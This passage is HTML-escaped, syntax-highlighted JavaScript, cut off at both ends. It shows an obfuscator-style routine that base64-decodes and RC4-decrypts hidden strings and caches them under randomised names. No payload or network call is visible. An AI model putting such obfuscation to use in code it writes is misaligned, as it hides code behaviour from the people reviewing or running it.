class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x8b960b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x584879&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x8b960b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;replace&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/=+$/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x38ec89&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xcfc329&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xd90795&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x409b70&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x429a24&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xd90795&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x584879&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;charAt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x409b70&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xd90795&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xcfc329&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x38ec89&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xcfc329&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xd90795&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xd90795&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x38ec89&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++%&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x429a24&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fromCharCode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xff&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xcfc329&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x38ec89&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xd90795&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4b80a9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;indexOf&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xd90795&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x429a24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;});}());&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x4f002d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5c44fa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x3f22ed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[],&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x17ee0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4a4ac3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x41b3d2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x329c74&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5c44fa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;atob&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5c44fa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x2ee72b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x1f3f1d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5c44fa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;length&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2ee72b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x1f3f1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2ee72b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x329c74&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;00&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5c44fa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;charCodeAt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2ee72b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;toString&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;slice&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);}&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5c44fa&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;decodeURIComponent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x329c74&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x17ee0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x17ee0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x3f22ed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;charCodeAt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x3f22ed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;length&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4a4ac3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x17ee0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x17ee0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4a4ac3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;}&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x17ee0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x4301cb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4301cb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5c44fa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;length&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4301cb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x17ee0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x17ee0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4a4ac3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x17ee0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x17ee0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4a4ac3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x41b3d2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fromCharCode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5c44fa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;charCodeAt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4301cb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xbc2d51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x2dee1d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x17ee0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x41b3d2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;};&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ZUnPBK&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4f002d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ffVsLy&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{};&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wlUhtf&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=!!&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[];}&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x5e7cc1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ffVsLy&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xec1512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5e7cc1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;undefined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;RhVTbi&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;undefined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;RhVTbi&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=!!&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[];}&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x353971&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ZUnPBK&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x353971&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x3f22ed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ffVsLy&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0xec1512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x353971&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x353971&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x5e7cc1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x353971&lt;/span&gt;&lt;span 